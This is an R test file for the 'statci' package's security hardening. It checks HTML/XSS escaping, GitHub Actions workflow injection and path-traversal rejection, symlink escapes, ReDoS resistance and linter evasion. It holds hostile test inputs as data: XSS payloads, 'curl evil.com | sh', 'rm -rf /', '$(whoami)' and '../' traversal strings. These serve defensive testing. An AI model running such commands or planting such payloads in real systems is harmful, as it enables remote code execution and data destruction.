# Adversarial security, anti-evasion, ReDoS, typography, and edge-case tests

# ===========================================================================
# 1. HTML XSS, CSP & Markdown HTML Neutralization
# ===========================================================================

test_that("render_statci_report strictly escapes XSS payloads across all fields and includes CSP", {
  xss_script <- "<script>alert('xss')</script>"
  xss_img <- "<img src=x onerror=alert(1)>"
  xss_svg <- "<svg/onload=alert(2)>"
  xss_attr <- "\" onmouseover=\"alert(3)"

  evil_rule <- new_stat_rule(
    id = paste0("rule_", xss_img),
    title = "Evil rule",
    severity = "error",
    check = function(ctx) {
      list(list(line = 1L, col = 1L, message = paste("Msg:", xss_script, xss_attr)))
    }
  )

  lint_res <- stat_lint_text(
    paste0("x <- 1 # ", xss_svg, "\n"),
    rules = list(evil_rule)
  )

  df_xss <- data.frame(
    term = xss_img,
    estimate = 1.0, std.error = 0.1, p.value = 0.01,
    conf.low = 0.8, conf.high = 1.2, n = 50,
    stringsAsFactors = FALSE
  )
  ms_res <- audit_manuscript_text(
    "b = 9.99",
    models = stats::setNames(list(df_xss), paste0("mod_", xss_script))
  )

  set.seed(7)
  df_s <- data.frame(x = rnorm(30))
  df_s$y <- 2 * df_s$x + rnorm(30, sd = 0.3)
  sens_res <- audit_sensitivity(
    df_s,
    fit_fn = function(d) lm(y ~ x, data = d),
    extract_fn = function(fit) stats::setNames(coef(fit)[["x"]], xss_svg),
    n_boot = 15L, max_loo_units = 10L, seed = 7L
  )

  rep <- statci_report(
    lint = lint_res,
    manuscript = ms_res,
    sensitivity = sens_res,
    title = paste("Audit", xss_script, xss_attr)
  )

  html <- render_statci_report(rep, format = "html")
  expect_false(grepl("<script", html, ignore.case = TRUE))
  expect_false(grepl("<img", html, ignore.case = TRUE))
  expect_false(grepl("<svg", html, ignore.case = TRUE))
  expect_false(grepl("<[^>]+on(error|mouseover|load)[[:space:]]*=", html, ignore.case = TRUE))
  expect_match(html, "&lt;img src=x onerror=alert\\(1\\)&gt;")
  expect_match(html, "Content-Security-Policy", fixed = TRUE)
  expect_match(html, "default-src 'none'", fixed = TRUE)
  expect_match(html, "&lt;script&gt;", fixed = TRUE)

  # Markdown table cells must also neutralize raw HTML tags
  md <- render_statci_report(rep, format = "markdown")
  expect_false(grepl("<script>alert", md, fixed = TRUE))
  expect_false(grepl("<img src=x", md, fixed = TRUE))
  expect_false(grepl("<svg/onload", md, fixed = TRUE))
  expect_match(md, "&lt;script&gt;", fixed = TRUE)
})

# ===========================================================================
# 2. GitHub Actions Workflow Injection & Path Traversal Defense
# ===========================================================================

test_that("use_statci_github_action blocks YAML, shell, R-code, branch, and path-traversal injections", {
  tmp <- tempfile("statci_gha_sec_")
  dir.create(tmp)
  on.exit(unlink(tmp, recursive = TRUE), add = TRUE)

  # Newline YAML step injection via r_version
  expect_error(
    use_statci_github_action(path = tmp, r_version = "release\n      - run: curl evil.com | sh"),
    "control characters|newlines|r_version"
  )
  # Invalid r_version string
  expect_error(
    use_statci_github_action(path = tmp, r_version = "4.4; rm -rf /"),
    "r_version"
  )
  # R code injection via lint_paths
  expect_error(
    use_statci_github_action(path = tmp, lint_paths = c('R"); system("id"); c("R')),
    "disallowed characters"
  )
  # Shell injection via report_dir
  expect_error(
    use_statci_github_action(path = tmp, report_dir = "reports; rm -rf /"),
    "disallowed characters"
  )
  # Path traversal via file or lint_paths or audit_script
  expect_error(
    use_statci_github_action(path = tmp, file = "../../outside.yaml"),
    "traversal"
  )
  expect_error(
    use_statci_github_action(path = tmp, lint_paths = c("../secrets")),
    "traversal"
  )
  expect_error(
    use_statci_github_action(path = tmp, audit_script = "scripts/run.sh"),
    "\\.R"
  )
  expect_error(
    use_statci_github_action(path = tmp, audit_script = "scripts/$(whoami).R"),
    "disallowed characters"
  )
  # Branch name injection
  expect_error(
    use_statci_github_action(path = tmp, branches = c("main", "feat\n  evil: true")),
    "control characters|newlines"
  )
  expect_error(
    use_statci_github_action(path = tmp, branches = c("main;id")),
    "Invalid Git branch"
  )

  # Valid hardened workflow uses env: indirection, pinned actions, and persist-credentials: false
  wf <- use_statci_github_action(
    path = tmp,
    branches = c("main", "release/v1"),
    r_version = "4.4.2",
    lint_paths = c("R", "analysis"),
    manuscript = "paper/main.qmd",
    models_path = "models/fits.rds"
  )
  txt <- paste(readLines(wf, warn = FALSE), collapse = "\n")
  expect_match(txt, "actions/checkout@v4")
  expect_match(txt, "r-lib/actions/setup-r@v2")
  expect_match(txt, "r-lib/actions/setup-r-dependencies@v2")
  expect_match(txt, "actions/upload-artifact@v4")
  expect_match(txt, "persist-credentials: false", fixed = TRUE)
  expect_match(txt, "STATCI_LINT_PATHS: 'R,analysis'", fixed = TRUE)
  expect_match(txt, "STATCI_MANUSCRIPT: 'paper/main.qmd'", fixed = TRUE)
  expect_match(txt, "Sys.getenv(\"STATCI_LINT_PATHS\"", fixed = TRUE)
  if (rlang::is_installed("yaml")) {
    parsed <- yaml::yaml.load_file(wf)
    on_block <- parsed[["on"]] %||% parsed[["TRUE"]]
    expect_equal(on_block$push$branches, c("main", "release/v1"))
  }
})

# ===========================================================================
# 3. Symlink Escape & Path Validation Defense
# ===========================================================================

test_that("audit_manuscript and stat_lint_dir reject symlink escapes and dangling symlinks", {
  skip_on_os("windows")
  tmp <- tempfile("statci_sym_")
  dir.create(tmp)
  on.exit(unlink(tmp, recursive = TRUE), add = TRUE)

  # Dangling symlink rejected by stat_lint()
  bad_link <- file.path(tmp, "broken.R")
  if (!isTRUE(suppressWarnings(file.symlink(file.path(tmp, "does_not_exist.R"), bad_link)))) {
    skip("Symlinks unavailable on this OS")
  }
  expect_error(stat_lint(bad_link), "broken|dangling")

  # Symlink escaping models directory rejected by audit_manuscript()
  outside_rds <- file.path(tmp, "secret.rds")
  saveRDS(lm(mpg ~ wt, data = mtcars), outside_rds)
  models_dir <- file.path(tmp, "models")
  dir.create(models_dir)
  if (!isTRUE(suppressWarnings(file.symlink(outside_rds, file.path(models_dir, "escaped.rds"))))) {
    skip("Symlinks unavailable on this OS")
  }
  expect_error(
    audit_manuscript_text("b = -5.34", models = models_dir),
    "symlink traversal"
  )

  # Symlink escaping lint directory is excluded cleanly by stat_lint_dir()
  outside_r <- file.path(tmp, "outside.R")
  writeLines("x <- rnorm(10)", outside_r)
  scan_dir <- file.path(tmp, "scan")
  dir.create(scan_dir)
  writeLines(c("set.seed(1)", "x <- rnorm(10)"), file.path(scan_dir, "clean.R"))
  if (!isTRUE(suppressWarnings(file.symlink(outside_r, file.path(scan_dir, "escaped.R"))))) {
    skip("Symlinks unavailable on this OS")
  }
  lres <- stat_lint_dir(scan_dir)
  expect_equal(lres$summary$n_files, 1L)
  expect_equal(nrow(lres$findings), 0L)
})

# ===========================================================================
# 4. ReDoS Latency Guard in audit_manuscript()
# ===========================================================================

test_that("audit_manuscript resists ReDoS on pathological oversized prose inputs", {
  df_t <- data.frame(
    term = "x1", estimate = 0.42, std.error = 0.11, p.value = 0.003,
    conf.low = 0.20, conf.high = 0.64, n = 100, stringsAsFactors = FALSE
  )

  payloads <- c(
    paste0("95% CI [", paste(rep("0", 15000), collapse = ""), " ", paste(rep("x", 15000), collapse = "")),
    paste0("<!-- statci: model=", paste(rep("a", 10000), collapse = ""), " term=", paste(rep("b ", 5000), collapse = "")),
    paste0(paste(rep("*", 20000), collapse = ""), " b = 0.42"),
    paste0(paste(rep("$", 20000), collapse = ""), " p = .003")
  )

  t0 <- proc.time()[["elapsed"]]
  for (p in payloads) {
    res <- audit_manuscript_text(p, models = list(m = df_t))
    expect_s3_class(res, "statci_manuscript_audit")
  }
  elapsed <- proc.time()[["elapsed"]] - t0
  expect_lt(elapsed, 2.0)
})

# ===========================================================================
# 5. AST Linter Evasion & False-Positive Gauntlet
# ===========================================================================

test_that("AST linter defeats evasion via lambdas, string-spoofed ignores, comments, pipes, and namespaces", {
  # 5a. R 4.1+ shorthand lambda \(x) detected in global_seed_override_in_fn and allowed in unseeded_randomness
  lam_bad <- stat_lint_text("f <- \\(x) { set.seed(1); rnorm(x) }\n", rules = "global_seed_override_in_fn")
  expect_equal(nrow(lam_bad$findings), 1L)
  lam_ok <- stat_lint_text("f <- \\(x) rnorm(x)\n", rules = "unseeded_randomness")
  expect_equal(nrow(lam_ok$findings), 0L)

  # 5b. Fake "# statci-ignore" inside a string literal CANNOT evade linting
  str_ign <- stat_lint_text('x <- rnorm(5); s <- "# statci-ignore"\n', rules = "unseeded_randomness")
  expect_equal(nrow(str_ign$findings), 1L)

  # 5c. Real # statci-ignore and # statci-ignore-next-line are strictly line-scoped
  sc1 <- stat_lint_text("x <- rnorm(5) # statci-ignore\ny <- rnorm(5)\n", rules = "unseeded_randomness")
  expect_equal(sc1$findings$line, 2L)
  sc2 <- stat_lint_text("# statci-ignore-next-line\nx <- rnorm(5)\ny <- rnorm(5)\n", rules = "unseeded_randomness")
  expect_equal(sc2$findings$line, 3L)

  # 5d. Fake ".Random.seed" string literal cannot evade global_seed_override_in_fn
  fake_rs <- stat_lint_text(
    'f <- function() { on.exit(NULL); set.seed(1); x <- ".Random.seed"; rnorm(5) }\n',
    rules = "global_seed_override_in_fn"
  )
  expect_equal(nrow(fake_rs$findings), 1L)

  # 5e. Comments mentioning isSingular or $convergence cannot evade missing_convergence_check
  cm_mlm <- stat_lint_text("fit <- lme4::lmer(y ~ x + (1 | g), data = df)\n# TODO: check isSingular\n", rules = "missing_convergence_check")
  expect_equal(nrow(cm_mlm$findings), 1L)
  cm_opt <- stat_lint_text("opt <- optim(0, fn)\n# $convergence should be 0\n", rules = "missing_convergence_check")
  expect_equal(nrow(cm_opt$findings), 1L)

  # 5f. Namespaced calls, pipes (|> and %>%), multiline calls
  ns_bad <- stat_lint_text("x <- stats::rnorm(10)\ny <- base::sample(1:5, 2)\n", rules = "unseeded_randomness")
  expect_equal(nrow(ns_bad$findings), 2L)
  pipe_leak1 <- stat_lint_text("set.seed(1)\ndf_s <- df |>\n  scale()\nsp <- initial_split(df_s)\n", rules = "preprocessing_before_split")
  expect_equal(nrow(pipe_leak1$findings), 1L)
  pipe_leak2 <- stat_lint_text("set.seed(1)\ndf_s <- df %>% scale()\nsp <- initial_split(df_s)\n", rules = "preprocessing_before_split")
  expect_equal(nrow(pipe_leak2$findings), 1L)

  # 5g. Zero false positives from comments & string literals containing code-like patterns
  clean_comments <- paste(
    "set.seed(42)",
    "# mclapply(1:4, rnorm)",
    "# fit <- lmer(y ~ x * w + (1 | g), data = df)",
    'msg <- "read.csv(\'/Users/alice/data.csv\'); mean(x) == 0.5; na.rm = T"',
    "x <- stats::rnorm(10)",
    sep = "\n"
  )
  fp_res <- stat_lint_text(clean_comments)
  expect_equal(nrow(fp_res$findings), 0L)

  # 5h. Quarto eval: false chunk with non-R pseudocode causes ZERO parse_error
  qmd_pseudo <- paste(
    "```{r}",
    "#| label: pseudo",
    "#| eval: false",
    "model = y ~ x1 + ... # illustrative pseudocode",
    "```",
    "",
    "```{r real}",
    "set.seed(1)",
    "x <- rnorm(10)",
    "```",
    sep = "\n"
  )
  pseudo_res <- stat_lint_text(qmd_pseudo, format = "qmd")
  expect_equal(nrow(pseudo_res$findings), 0L)

  # 5i. Rule 14: duplicate_parallel_seed catches constant set.seed() in loops/workers, passes varying seeds
  dup_bad <- stat_lint_text(
    "RNGkind(\"L'Ecuyer-CMRG\")\nres <- parallel::mclapply(1:4, function(i) { set.seed(42); rnorm(10) })\nfor (j in 1:5) { set.seed(1); rnorm(2) }\n",
    rules = "duplicate_parallel_seed"
  )
  expect_equal(nrow(dup_bad$findings), 2L)
  dup_ok <- stat_lint_text(
    "set.seed(42)\nres <- lapply(1:4, function(i) { set.seed(100 + i); rnorm(10) })\n",
    rules = "duplicate_parallel_seed"
  )
  expect_equal(nrow(dup_ok$findings), 0L)

  # 5j. Large 500-line script lints quickly without stack/recursion failures
  big_script <- paste(c("set.seed(1)", rep("x <- stats::rnorm(5)", 500L)), collapse = "\n")
  t0 <- proc.time()[["elapsed"]]
  big_res <- stat_lint_text(big_script)
  expect_equal(nrow(big_res$findings), 0L)
  expect_lt(proc.time()[["elapsed"]] - t0, 5.0)
})

# ===========================================================================
# 6. Manuscript Typography, Scientific Notation & IEEE-754 Rounding Boundaries
# ===========================================================================

test_that("audit_manuscript handles scientific notation, Unicode/en-dash, leading dots, -0.00, and half-to-even boundaries", {
  df_sci <- data.frame(
    term = c("x1", "x2", "x3", "x4"),
    estimate = c(-0.035, -0.424, 0.002, 0.425),
    std.error = c(0.005, 0.041, 0.050, 0.100),
    p.value = c(1.2e-4, 0.003, 0.960, 0.00008),
    conf.low = c(-0.045, -0.504, -0.096, 0.229),
    conf.high = c(-0.025, -0.344, 0.100, 0.621),
    n = c(100, 100, 100, 100),
    stringsAsFactors = FALSE
  )

  # Scientific notation: -3.5e-2, 1.2e-4, 1.2 × 10^-4, CI with `to` and en-dash range
  prose <- paste(
    "<!-- statci: model=m term=x1 -->",
    "Scientific: b = -3.5e-2, p = 1.2e-4, 95% CI: -0.045 to -0.025.",
    "<!-- statci: model=m term=x1 -->",
    "LaTeX scientific: p = 1.2 \\times 10^{-4}, 95% CI [-0.045\u2013-0.025].",
    "<!-- statci: model=m term=x2 -->",
    "Leading dot & Unicode minus: b = \u2212.42, p = .003, 95% CI [\u22120.50, \u20130.34].",
    "<!-- statci: model=m term=x3 -->",
    "Negative zero near zero: b = -0.00.",
    "<!-- statci: model=m term=x4 -->",
    "Half-to-even boundary: b = 0.42, p < 1e-4.",
    sep = "\n"
  )

  res <- audit_manuscript_text(prose, models = list(m = df_sci))
  expect_equal(res$status, "pass")
  expect_equal(res$summary$n_fail, 0L)
  expect_equal(res$summary$n_sign_flips, 0L)
  expect_gte(res$summary$n_claims, 11L)

  # IEEE-754 tricky boundary: 0.145 rounded to 0.14 OR 0.15 both pass
  df_b <- data.frame(term = "x", estimate = 0.145, std.error = 0.05, p.value = 0.01, conf.low = 0.04, conf.high = 0.25, n = 50)
  expect_equal(audit_manuscript_text("b = 0.14", models = df_b)$status, "pass")
  expect_equal(audit_manuscript_text("b = 0.15", models = df_b)$status, "pass")
})

# ===========================================================================
# 7. Adversarial Calibration, SBC, Parallel RNG & Sensitivity Failure Modes
# ===========================================================================

test_that("audit_estimator, audit_sbc, check_parallel_rng, and audit_sensitivity survive adversarial edge cases", {
  # 7a. 100% NaN / Inf estimates -> counted as non-converged, fail cleanly without crash
  res_nan <- audit_estimator(
    dgp = function() rnorm(10),
    estimator = function(y) list(estimate = c(mu = NaN), se = c(mu = Inf)),
    true_params = c(mu = 0),
    n_sim = 15L,
    seed = 1L
  )
  expect_equal(res_nan$status, "fail")
  expect_equal(res_nan$convergence$fail_rate, 1.0)

  # 7b. 100% non-converged estimator -> clean fail without crash
  res_nc <- audit_estimator(
    dgp = function() rnorm(10),
    estimator = function(y) list(estimate = c(mu = 1), se = c(mu = 0.1), converged = FALSE),
    true_params = c(mu = 0),
    n_sim = 15L,
    seed = 1L
  )
  expect_equal(res_nc$status, "fail")
  expect_equal(res_nc$convergence$fail_rate, 1.0)

  # 7c. Zero-variance biased constant estimator -> bias fails cleanly
  res_zb <- audit_estimator(
    dgp = function() rnorm(10),
    estimator = function(y) list(estimate = c(mu = 5.0), se = c(mu = 0.0)),
    true_params = c(mu = 0.0),
    n_sim = 15L,
    seed = 1L
  )
  expect_equal(res_zb$status, "fail")
  expect_equal(res_zb$recovery$bias_status, "fail")

  # 7d. Multi-parameter vector estimator (point estimates only)
  res_mp <- audit_estimator(
    dgp = function() cbind(rnorm(50, 1), rnorm(50, -2), rnorm(50, 3)),
    estimator = function(m) c(a = mean(m[, 1]), b = mean(m[, 2]), c = mean(m[, 3])),
    true_params = c(a = 1, b = -2, c = 3),
    n_sim = 60L,
    seed = 9L
  )
  expect_equal(res_mp$status, "pass")
  expect_equal(nrow(res_mp$recovery), 3L)

  # 7e. SBC with NaN draws returns structured fail (no crash) + small-B bin guard
  sbc_nan <- audit_sbc(
    prior = function() c(mu = rnorm(1)),
    dgp = function(th) rnorm(5, th),
    posterior_draws = function(y) c(NaN, rnorm(19)),
    n_sim = 15L,
    n_bins = 5L
  )
  expect_s3_class(sbc_nan, "statci_sbc")
  expect_equal(sbc_nan$status, "fail")
  expect_equal(sbc_nan$n_valid, 0L)

  # High n_bins relative to n_sim capped safely without error
  sbc_small <- audit_sbc(
    prior = function() c(mu = rnorm(1, 0, 2)),
    dgp = function(th) rnorm(10, th, 1),
    posterior_draws = function(y) {
      pv <- 1 / (1 / 4 + length(y))
      rnorm(29, pv * sum(y), sqrt(pv))
    },
    n_sim = 20L,
    n_bins = 50L,
    seed = 12L
  )
  expect_s3_class(sbc_small, "statci_sbc")
  expect_lte(sbc_small$n_bins, 10L)

  # 7f. check_parallel_rng reliably catches naive mclapply (Unix/macOS)
  if (.Platform$OS.type == "unix") {
    mc_bad <- check_parallel_rng(
      runner = function(cores, seed) {
        set.seed(seed)
        parallel::mclapply(1:6, function(i) rnorm(4), mc.cores = cores)
      },
      cores = c(1L, 2L),
      seed = 42L
    )
    expect_equal(mc_bad$status, "fail")
    expect_false(mc_bad$identical_all)
    expect_gt(mc_bad$max_abs_diff, 0)
  }

  # 7g. audit_sensitivity handles unbalanced clusters, single-cluster guard, and NaN/Inf refits
  set.seed(8)
  df_unbal <- data.frame(
    cl = c("A", rep("B", 3), rep("C", 25), rep("D", 30)),
    x = rnorm(59),
    all_na = NA_real_
  )
  df_unbal$y <- 1 + 1.5 * df_unbal$x + rnorm(59, sd = 0.4)
  s_u <- audit_sensitivity(
    df_unbal,
    fit_fn = function(d) lm(y ~ x, data = d),
    cluster_col = "cl",
    n_boot = 20L,
    seed = 8L
  )
  expect_s3_class(s_u, "statci_sensitivity")
  expect_true(all(is.finite(s_u$baseline)))

  # Single-cluster dataset warns gracefully instead of crashing LOCO
  df_one <- data.frame(cl = rep("only", 30), x = rnorm(30))
  df_one$y <- 1 + 2 * df_one$x + rnorm(30, sd = 0.3)
  s_one <- audit_sensitivity(
    df_one,
    fit_fn = function(d) lm(y ~ x, data = d),
    cluster_col = "cl",
    n_boot = 15L,
    seed = 8L
  )
  expect_true(any(grepl("Only 1 unique cluster", s_one$results$detail)))
})
